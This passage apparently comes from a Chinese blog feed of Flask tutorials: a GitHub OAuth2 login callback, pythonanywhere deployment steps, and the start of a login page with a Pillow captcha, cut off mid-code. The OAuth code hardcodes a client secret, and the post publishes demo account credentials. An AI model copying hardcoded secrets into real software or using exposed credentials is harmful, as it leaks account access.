class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据回环路由,更改<code>oauth app</code>的<code>callback</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-5/1599293976556-10277.png" alt="10277"></p><ol start="5"><li><code>github</code>返回<code>token</code></li><li>使用<code>token</code>访问资源服务器<code>API</code>.对于<code>github</code>来说,类似如下;</li></ol><pre class="line-numbers language-html"><code class="language-html">Authorization: token OAUTH-TOKENGET https://api.github.com/user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改代码如下:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token keyword">from</span> furl <span class="token keyword">import</span> furl<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonifyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span>    <span class="token string">'TEMPLATES_AUTO_RELOAD'</span> <span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>client_id <span class="token operator">=</span> <span class="token string">'7f8130a3d487dbc'</span>client_secret <span class="token operator">=</span> <span class="token string">'d359b42eaa292234fc8ed89d5bae776d'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/redirect_github/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">redirect_github</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://github.com/login/oauth/authorize'</span> <span class="token comment" spellcheck="true"># 这是官网给定的地址,且必须使用 get 方法</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'client_id'</span><span class="token punctuation">:</span> client_id<span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># 必填</span>        <span class="token string">'scope'</span> <span class="token punctuation">:</span> <span class="token string">'read:user user:email'</span>    <span class="token punctuation">}</span>    url <span class="token operator">=</span> furl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>set<span class="token punctuation">(</span>params<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/oauth2/callback'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">oauth2_callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 获取code</span>    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 根据code 获取 token</span>    access_token_url <span class="token operator">=</span> <span class="token string">'https://github.com/login/oauth/access_token'</span>    <span class="token comment" spellcheck="true"># 可用参数</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'client_id'</span><span class="token punctuation">:</span>client_id<span class="token punctuation">,</span>        <span class="token string">'client_secret'</span><span class="token punctuation">:</span>client_secret<span class="token punctuation">,</span>        <span class="token string">'code'</span><span class="token punctuation">:</span>code    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># 发送 post</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>access_token_url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------'</span><span class="token punctuation">,</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 获取token</span>    access_toke <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'access_token'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'access_token:'</span><span class="token punctuation">,</span> access_toke<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 获取到token后,访问资源服务器</span>    access_user_url <span class="token operator">=</span> <span class="token string">'https://api.github.com/user'</span>    <span class="token comment" spellcheck="true"># 注意下方 token 后有一个空格</span>    rr <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>access_user_url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span><span class="token string">'token '</span> <span class="token operator">+</span> access_toke<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回获取到的</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'sucess'</span><span class="token punctuation">,</span>        <span class="token string">'data'</span><span class="token punctuation">:</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>rr<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了便于观看,使用了<code>jsonfy</code>输出到页面上,正常情况下,这一步是不能让用户看到的,需要再次使用<code>redirect</code>跳转到其他页面.</p><p>拿到用户的信息后,可以基于此信息做进一步的处理.</p></blockquote><h4 id="隐式token"><a href="#隐式token" class="headerlink" title="隐式token"></a>隐式<code>token</code></h4><blockquote><p>请参照协议</p></blockquote><h4 id="密码模式"><a href="#密码模式" class="headerlink" title="密码模式"></a>密码模式</h4><blockquote><p>请参照协议</p></blockquote><h4 id="客户端模式"><a href="#客户端模式" class="headerlink" title="客户端模式"></a>客户端模式</h4><blockquote><p>请参照协议</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E6%8E%88%E6%9D%83" target="_blank" rel="noopener">OAuth维基百科</a></p><p><a href="https://oauth.net/2" target="_blank" rel="noopener">OAuth官方</a></p><p><a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">rfc6749</a></p><p><a href="https://docs.github.com/cn/developers/apps/authorizing-oauth-apps" target="_blank" rel="noopener">github oauth</a></p><p><a href="https://docs.github.com/en/developers/apps/scopes-for-oauth-apps#available-scopes" target="_blank" rel="noopener">github socpe</a></p><p><a href="https://deepzz.com/post/what-is-oauth2-protocol.html" target="_blank" rel="noopener">参考1</a></p><p><a href="https://gitee.com/api/v5/oauth_doc#/list-item-1" target="_blank" rel="noopener">gitee oauth</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> OAuth2.0 </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask在线部署</title>
      <link href="/posts/16740.html"/>
      <url>/posts/16740.html</url>
      
        <content type="html"><![CDATA[<h2 id="Flask在线部署"><a href="#Flask在线部署" class="headerlink" title="Flask在线部署"></a><code>Flask</code>在线部署</h2><blockquote><p>到目前为止,我们的<code>Flask</code>网站只能跑在本机电脑上,而不能在互联网上看到.这样既不方面调试,也不方便我们展示自己的成果.于是,一个能够在线展示<code>demo</code>的网站,就变成了我们的急切需求.</p><p>如果,自己花钱买服务器在部署网站,肯定能满足需求,但是也有免费的方案可供选择,这就是<code>pythonanywhere</code>.</p></blockquote><h3 id="1-pythonanywhere"><a href="#1-pythonanywhere" class="headerlink" title="1.pythonanywhere"></a>1.<code>pythonanywhere</code></h3><blockquote><p><code>Pythonanywhere</code>是一个基于<code>python</code>的<code>web</code>托管服务,网址<code>https://www.pythonanywhere.com</code>.免费的账户支持创建一个站点,系统会分配一个二级域名.<code>xxx.pythonanywhere.com</code>,其中<code>xxx</code>代表注册账户时使用的用户名.所以这个还是比较重要的.</p><p>站点会免费维持2个月,然后被系统删除.</p></blockquote><h3 id="2-注册"><a href="#2-注册" class="headerlink" title="2.注册"></a>2.注册</h3><blockquote><p><a href="https://www.pythonanywhere.com/" target="_blank" rel="noopener">pythonanywhere</a>:<code>https://www.pythonanywhere.com</code>,访问网站,选择注册账户,需要注意的是,注册的用户名会称为你的网站的一部分.所以,最好选择和自己网站内容相关的名字.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599051996097-10247.png" alt="10247"></p></blockquote><h3 id="3-创建站点"><a href="#3-创建站点" class="headerlink" title="3.创建站点"></a>3.创建站点</h3><blockquote><ul><li><p>注册完成后,来到首页,点击<code>Files</code></p></li><li><p>然后创建一个站点,</p></li><li><p>最后,网页会提示你上传文档,这里有2个选择.可以选择上传自己<code>demo</code>代码的压缩包上传.或者打开<code>bash</code>使用<code>git</code>命令拉取自己<code>github</code>仓库.</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599052324916-10248.png" alt="10248"></p><hr><ul><li>打开<code>bash</code>:</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599052478491-10249.png" alt="10249"></p><ul><li>打开自己的<code>github</code>,找到自己的项目,获取下载地址:</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599052679298-10250.png" alt="10250"></p><ul><li>在<code>bash</code>中下载自己的项目</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599052849212-10251.png" alt="10251"></p><ul><li>下载完毕后,即可进入到自己的项目目录中</li></ul><pre class="line-numbers language-bash">cd  deom_code</code></pre></blockquote><h3 id="4-创建web"><a href="#4-创建web" class="headerlink" title="4.创建web"></a>4.创建<code>web</code></h3><blockquote><ul><li>点击<code>web</code>创建<code>web app</code>.注意免费账户只能创建一个<code>app</code>,</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599053133153-10252.png" alt="10252"></p><ul><li>点击下一步,会让选择自己的<code>web</code>框架,这里我们选择使用<code>flask</code>.</li><li>点击下一步,选择使用的<code>python</code>版本.这个要根据自己的项目的实际使用情况选择.</li><li>创建完毕后,会有一个汇总页面.这里有2个需要注意的地方<ul><li><code>source code</code>:指定了前面我们创建的文件夹,如果不是,需要手动指定.</li><li><code>wsgi configuration file</code>:<code>wsgi</code>框架,指定要运行的<code>app</code>文件.这个文件指定了<code>flask</code>的主运行文件必须是<code>app.py</code></li><li><code>virtualenv</code>:虚拟环境,强烈建议使用虚拟环境,配置自己的<code>app</code></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599053449167-10253.png" alt="10253"></p></blockquote><h4 id="1-virtualenv"><a href="#1-virtualenv" class="headerlink" title="1.virtualenv"></a>1.<code>virtualenv</code></h4><blockquote><p><code>pythonanywhere</code>下的<code>python</code> 虚拟环境管理.</p><ul><li>登录到<code>bash colsole</code>后,可以创建虚拟环境.</li></ul><pre><code class="bash"><code class="language-bash">cd  deom_code</code></pre></blockquote><h3 id="4-创建web"><a href="#4-创建web" class="headerlink" title="4.创建web"></a>4.创建<code>web</code></h3><blockquote><ul><li>点击<code>web</code>创建<code>web app</code>.注意免费账户只能创建一个<code>app</code>,</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599053133153-10252.png" alt="10252"></p><ul><li>点击下一步,会让选择自己的<code>web</code>框架,这里我们选择使用<code>flask</code>.</li><li>点击下一步,选择使用的<code>python</code>版本.这个要根据自己的项目的实际使用情况选择.</li><li>创建完毕后,会有一个汇总页面.这里有2个需要注意的地方<ul><li><code>source code</code>:指定了前面我们创建的文件夹,如果不是,需要手动指定.</li><li><code>wsgi configuration file</code>:<code>wsgi</code>框架,指定要运行的<code>app</code>文件.这个文件指定了<code>flask</code>的主运行文件必须是<code>app.py</code></li><li><code>virtualenv</code>:虚拟环境,强烈建议使用虚拟环境,配置自己的<code>app</code></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599053449167-10253.png" alt="10253"></p></blockquote><h4 id="1-virtualenv"><a href="#1-virtualenv" class="headerlink" title="1.virtualenv"></a>1.<code>virtualenv</code></h4><blockquote><p><code>pythonanywhere</code>下的<code>python</code> 虚拟环境管理.</p><ul><li>登录到<code>bash colsole</code>后,可以创建虚拟环境.</li></ul><pre><code class="bash"># 根据自己的实际情况,指定python版本$  mkvirtualenv mylearn --python=3.7(mylearn) $ which python/home/myusername/.virtualenvs/mylearn/bin/python(mylearn) $ deactivate$ which python/usr/bin/python$ workon mylearn(mylearn) $ which python/home/myusername/.virtualenvs/mylearn/bin/python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>创建好虚拟环境后,需要指定要安装的第三方插件.我们这里使用<code>pip</code>的功能完成</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 登录到自己本机虚拟环境中,使用pip打包第三方应用</span><span class="token comment" spellcheck="true"># 我的本机虚拟环境是learnpy , pythonanywhere 是 mylearn</span><span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span>$ pip freeze <span class="token operator">></span> requirements.txt<span class="token comment" spellcheck="true"># 文件形式如下</span><span class="token comment" spellcheck="true"># alembic==1.0.10</span><span class="token comment" spellcheck="true"># blinker==1.4</span><span class="token comment" spellcheck="true"># Click==7.0</span><span class="token comment" spellcheck="true"># dominate==2.3.5</span><span class="token comment" spellcheck="true"># Flask==1.0.3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>上传文件到<code>pythonanywhere</code>,然后登录到<code>bash colsole</code>,即可安装所有的依赖包</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>mylearn<span class="token punctuation">)</span> $ pip <span class="token function">install</span> -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h4 id="2-log"><a href="#2-log" class="headerlink" title="2.log"></a>2.<code>log</code></h4><blockquote><p>如果<code>app</code>有任何的问题,要主动关注<code>error.log</code>来解决问题.</p></blockquote><h3 id="5-访问网站"><a href="#5-访问网站" class="headerlink" title="5.访问网站"></a>5.访问网站</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599053133153-10252.png" alt="10252"></p><p>点击上图中<code>ningwenyan.pythonanywhere.com</code>的连接,就可以跳转到自己的网站:</p><p><img src="https://tva1.sinaimg.cn/large/a20ab060ly1giacwb82ytg20zn0md42t.gif" alt="login_demo.gif"></p></blockquote><h3 id="6-添加MySQL数据库"><a href="#6-添加MySQL数据库" class="headerlink" title="6.添加MySQL数据库"></a>6.添加<code>MySQL</code>数据库</h3><blockquote><p>如果你是免费账户,你不允许使用外部数据库的.幸好,<code>pythonanywhere</code>提供了小型的<code>mysql</code>数据库.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-2/1599055761788-10254.png" alt="10254"></p></blockquote><h3 id="7-问题"><a href="#7-问题" class="headerlink" title="7.问题"></a>7.问题</h3><blockquote><p>如果你有问题,可以在下方留言,一起讨论解决.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单登录页面</title>
      <link href="/posts/10240.html"/>
      <url>/posts/10240.html</url>
      
        <content type="html"><![CDATA[<h2 id="简单登录页面"><a href="#简单登录页面" class="headerlink" title="简单登录页面"></a>简单登录页面</h2><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-8-29/1598704279815-10232.png" alt="10232"></p><blockquote><p>使用<code>Flask+MySQL+Pillow</code>实现简单登录验证界面.</p><p>访问我的<a href="ningwenyan.pythonanywhere.com/">demo</a>:<code>ningwenyan.pythonanywhere.com/</code></p><p>以下教程中,如果你的浏览器不能得到正确的网站,请尝试清除浏览器<code>cookie</code></p></blockquote><h3 id="demo登录测试"><a href="#demo登录测试" class="headerlink" title="demo登录测试"></a><code>demo</code>登录测试</h3><blockquote><p>访问我的<a href="ningwenyan.pythonanywhere.com/">demo</a>:<code>ningwenyan.pythonanywhere.com/</code>,(测试<code>demo 2020-10-5</code>过期)开放测试账户</p><ul><li><code>username:Jack</code></li><li><code>password:123456</code></li></ul><hr><p>示例代码:<code>https://github.com/ningwenyan/demo_code/tree/master/login_demo</code></p><hr><ul><li>登录演示:</li></ul><p><img src="https://tva1.sinaimg.cn/large/a20ab060ly1giacwb82ytg20zn0md42t.gif" alt="login_demo.gif"></p><ul><li><code>github</code>第三方登录</li></ul><p><img src="https://tva1.sinaimg.cn/large/a20ab060ly1giae70zs24g20zn0mdjyt.gif" alt="gihub_login_callback.gif"></p></blockquote><h3 id="1-创建Flask项目"><a href="#1-创建Flask项目" class="headerlink" title="1.创建Flask项目"></a>1.创建<code>Flask</code>项目</h3><blockquote><p>为这个项目创建一个文件夹,并初始化.</p><pre class="line-numbers language-bash"><code class="language-bash">$ tree├── login_demo ├── app.py ├── static └── templates$ <span class="token function">cd</span> login_demo$ <span class="token function">git</span> init$ <span class="token function">touch</span> .gitignore<span class="token comment" spellcheck="true"># 创建ignore,内容可以参考上传的文件</span>$ vim .gitignore$ <span class="token function">git</span> add <span class="token keyword">.</span>$  <span class="token function">git</span> commit -m <span class="token string">"初始化"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-创建config-py"><a href="#2-创建config-py" class="headerlink" title="2.创建config.py"></a>2.创建<code>config.py</code></h3><blockquote><p><code>config.py</code>这个文件用来保存我们所有的配置,然后在导入到主配置文件中.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># config.py</span>DEBUG <span class="token operator">=</span> <span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-配置app-py"><a href="#3-配置app-py" class="headerlink" title="3.配置app.py"></a>3.配置<code>app.py</code></h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> configapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'index page'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.110'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这只是初始的网站,现在我们改造这个网站,让它默认跳转到注册页面</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_forapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.110'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然,作为渲染的模板<code>login.html</code>也需要被创建在<code>templates</code>文件夹下.</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Login Wenyan.online<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-创建工具包"><a href="#4-创建工具包" class="headerlink" title="4.创建工具包"></a>4.创建工具包</h3><blockquote><p>把所有的工具类的<code>python</code>代码都放入一个<code>utils</code>中.这是一个<code>python package</code>结构.</p><p>然后再新建一个<code>python package</code>包<code>captcha</code>用来存放<code>pillow</code>生成的验证码.</p><pre class="line-numbers language-bash"><code class="language-bash">❯ tree<span class="token keyword">.</span>├── app.py├── config.py├── static│   ├── CSS│   │   └── base.css│   ├── IMAGE│   │   └── logo.png│   └── JS├── templates│   └── login.html└── utils├── captcha│   └── __init__.py└── __init__.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改<code>captcha/__init__.py</code>文件如下:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token comment" spellcheck="true"># 创建验证码</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDraw<span class="token punctuation">,</span> ImageFont<span class="token punctuation">,</span>ImageFilter<span class="token keyword">import</span> random<span class="token triple-quoted-string string">"""Image: 创建画布ImageDraw : 创建画笔ImageFont: 画笔字体ImageFilter: 滤镜效果,模糊效果"""</span><span class="token keyword">class</span> <span class="token class-name">Captcha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">40</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 生成随机字母，根据ASCII表中得到的数据65-90为A-Z的大写字母</span>@classmethod<span class="token keyword">def</span> <span class="token function">__gene_rnd_char</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> chr<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">65</span><span 